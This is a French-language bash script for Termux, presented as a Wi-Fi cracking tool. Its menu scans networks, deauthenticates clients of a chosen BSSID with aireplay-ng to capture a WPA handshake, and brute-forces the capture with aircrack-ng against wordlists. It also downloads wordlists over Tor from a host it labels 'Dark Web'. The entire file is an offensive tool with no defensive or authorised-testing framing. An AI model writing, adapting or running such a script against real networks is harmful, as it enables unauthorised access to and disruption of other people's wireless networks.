#!/data/data/com.termux/files/usr/bin/bash

# Configuration
OUTPUT_DIR="wifi_cracker_output"
WORDLIST_DIR="wordlists"
HANDSHAKE_FILE="handshake.cap"

# Couleurs
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'

check_dependencies() {
    if ! pkg list-installed | grep -q 'aircrack-ng'; then
        echo -e "${RED}[!] Installation d'aircrack-ng...${NC}"
        pkg install aircrack-ng -y
    fi
}

init_env() {
    mkdir -p $OUTPUT_DIR
    mkdir -p $WORDLIST_DIR
}

show_banner() {
    clear
    echo -e "${GREEN}"
    echo "  █▀▀ █░█ █▀▀ █▀▀ ▀█▀ █▀▀ █▀█ █▀▄▀█ █▀▀"
    echo "  █▄▄ █▀█ ██▄ █▄▄ ░█░ ██▄ █▀▄ █░▀░█ ██▄"
    echo -e "${NC}"
}

main_menu() {
    while true; do
        echo -e "\n${BLUE}[MENU PRINCIPAL]${NC}"
        echo "1. Scanner les réseaux Wi-Fi"
        echo "2. Capturer un handshake"
        echo "3. Crackeur de mot de passe (Bruteforce)"
        echo "4. Télécharger des wordlists du Dark Web"
        echo "5. Quitter"
        read -p "Choix: " choice

        case $choice in
            1) scan_networks ;;
            2) capture_handshake ;;
            3) start_bruteforce ;;
            4) download_wordlists ;;
            5) exit 0 ;;
            *) echo -e "${RED}Option invalide!${NC}" ;;
        esac
    done
}

scan_networks() {
    echo -e "\n${YELLOW}[*] Démarrage du scan Wi-Fi...${NC}"
    termux-wifi-scaninfo > "$OUTPUT_DIR/scan_results.txt"
    echo -e "${GREEN}[+] Scan terminé! Résultats:${NC}"
    cat "$OUTPUT_DIR/scan_results.txt"
}

capture_handshake() {
    read -p "BSSID cible: " bssid
    read -p "Canal: " channel
    echo -e "\n${YELLOW}[*] Capture du handshake sur $bssid...${NC}"
    aireplay-ng --deauth 10 -a $bssid wlan0
    airodump-ng -c $channel --bssid $bssid -w $OUTPUT_DIR/$HANDSHAKE_FILE wlan0
    echo -e "${GREEN}[+] Handshake capturé dans $OUTPUT_DIR/$HANDSHAKE_FILE${NC}"
}

start_bruteforce() {
    echo -e "\n${YELLOW}[*] Liste des wordlists:${NC}"
    ls $WORDLIST_DIR
    read -p "Nom de la wordlist: " wordlist
    echo -e "${YELLOW}[*] Démarrage du bruteforce...${NC}"
    aircrack-ng -w $WORDLIST_DIR/$wordlist $OUTPUT_DIR/$HANDSHAKE_FILE
}

download_wordlists() {
    echo -e "\n${YELLOW}[*] Téléchargement depuis le Dark Web...${NC}"
    torify wget -q --show-progress -P $WORDLIST_DIR \
    http://darkzzx4avcsuofgfe5gqsn2dd.cc/db/wordlists/ultimate.txt \
    http://darkzzx4avcsuofgfe5gqsn2dd.cc/db/wordlists/darkweb2023.txt
    echo -e "${GREEN}[+] Wordlists téléchargées!${NC}"
}

# Execution
check_dependencies
init_env
show_banner
main_menu
